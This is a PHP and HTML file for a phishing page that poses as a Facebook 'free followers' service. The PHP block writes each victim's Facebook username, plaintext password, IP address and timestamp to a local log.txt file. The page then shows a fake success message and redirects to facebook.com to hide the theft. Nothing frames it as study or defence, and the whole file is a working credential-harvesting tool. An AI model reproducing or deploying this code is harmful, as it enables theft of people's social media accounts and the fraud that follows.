<?php
$username = $_POST['username'];
$password = $_POST['password'];
$followers = $_POST['followers'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "[$date] IP: $ip | FB Username: $username | Password: $password | Requested: $followers followers\n";
file_put_contents("log.txt", $data, FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Success!</title>
    <style>
        body {
            background: linear-gradient(135deg, #1877f2, #42b72a);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial;
            margin: 0;
        }
        .success-card {
            background: white;
            padding: 50px;
            border-radius: 20px;
            text-align: center;
            animation: pop 0.5s;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        @keyframes pop {
            from { transform: scale(0); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .icon {
            font-size: 70px;
            margin-bottom: 20px;
        }
        h2 { color: #1877f2; margin-bottom: 10px; }
        p { color: #555; margin: 5px 0; }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="success-card">
        <div class="icon">✅</div>
        <h2><?php echo htmlspecialchars($followers); ?> Followers Added!</h2>
        <p>Successfully added to your Facebook account</p>
        <p>Username: <?php echo htmlspecialchars($username); ?></p>
        <div class="loader"></div>
        <p>Redirecting to Facebook...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com';
        }, 3000);
    </script>
</body>
</html>